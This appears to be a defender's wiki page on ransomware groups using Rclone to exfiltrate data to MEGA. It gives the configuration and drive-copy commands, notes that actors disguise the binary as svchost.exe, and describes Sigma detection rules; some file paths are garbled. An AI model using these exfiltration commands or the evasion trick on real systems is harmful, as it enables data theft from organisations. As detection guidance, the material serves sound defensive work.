# Rclone - Data Exfiltration

## Introduction

[Rclone](https://attack.mitre.org/software/S1040) is a command line program for syncing files with cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA. [Rclone](https://attack.mitre.org/software/S1040) has been used in a number of ransomware campaigns, including those associated with the [Conti](https://attack.mitre.org/software/S0575) and DarkSide Ransomware-as-a-Service operations.



***

## Practical

Rclone requires a configuration to be created before it can connect to MEGA (or other cloud storage provider) which can be done in one of two ways:

**On the command line:**

```
.rclone.exe config create remote mega user [redacted]@outlook.com pass [redacted]
```

The table below breaks down the command line profile creation.

| config | Initiates the configuration file being created                                            |
| ------ | ----------------------------------------------------------------------------------------- |
| create | Creation of configuration file                                                            |
| remote | Name given to the remote profile being created (name can vary)                            |
| mega   | Cloud storage provider                                                                    |
| user   | Username for the MEGA.io account                                                          |
| pass   | Password for the MEGA.io account [obscured](https://rclone.org/commands/rclone\_obscure/) |



**Alternatively the inbuilt configuration guide can be used which walks through the process offering different options:**

```
.rclone.exe config
```

Once the profile has been created the following configuration file is created:

```
C:Users.configrclonerclone.conf
```

Once the configuration has been made it is possible to connect to MEGA and exfiltrate the data. In examples observed, threat actors have accessed file servers, browsed shared drives and then pointed Rclone at the drives like the example below.

```
.rclone.exe copy E: remote:data
```

| copy   | Command for copying data                                        |
| ------ | --------------------------------------------------------------- |
| E:     | Drive or folder which data is to be copied from                 |
| remote | Specifies the remote profile created in the configuration stage |
| data   | Folder on MEGA where the data is copied to                      |



Once the data is being copied there is outbound traffic to subdomains of `userstorage.mega.co[.]nz` such as `gfs270n071.userstorage.mega.co[.]nz`. The domains typically resolve to IP addresses associate with the MEGA ASN 205809 but not in all cases. Where MEGA is not used, there is typically a large volume of outbound traffic to a single IP address which can be seen as a spike in any network monitoring.

In some cases actors have been observed changing the executable name to avoid detection. A recent case found the actor had renamed the Rclone binary to `svchost.exe` and placed it in the directory `C:Windows`.



***

## Detection

### Sigma Rules

The following Sigma rules has been created to aid in the detection of Rclone.

| Rclone Execution via Command Line or PowerShell | This rule detects the execution of Rclone.                                                                                                                                                      |
| ----------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Rclone config file creation                     | <p>This Sigma rule will detect the creation of the Rclone configuration file. The Sysmon configuration must include the following for the FileCreate rule group.<br><br><code>rclone</code></p> |
| DNS Query for MEGA.io Upload Domain             | This final rule will detect DNS queries for subdomains of `userstorage.mega.co[.]nz.`                                                                                                           |

\




***

## REFERENCES

* [https://www.nccgroup.com/us/research-blog/detecting-rclone-an-effective-tool-for-exfiltration/](https://www.nccgroup.com/us/research-blog/detecting-rclone-an-effective-tool-for-exfiltration/)
* [https://redcanary.com/blog/threat-detection/rclone-mega-extortion/](https://redcanary.com/blog/threat-detection/rclone-mega-extortion/)
* [https://attack.mitre.org/software/S1040/](https://attack.mitre.org/software/S1040/)
* [https://rclone.org/commands/rclone\_obscure/](https://rclone.org/commands/rclone\_obscure/)





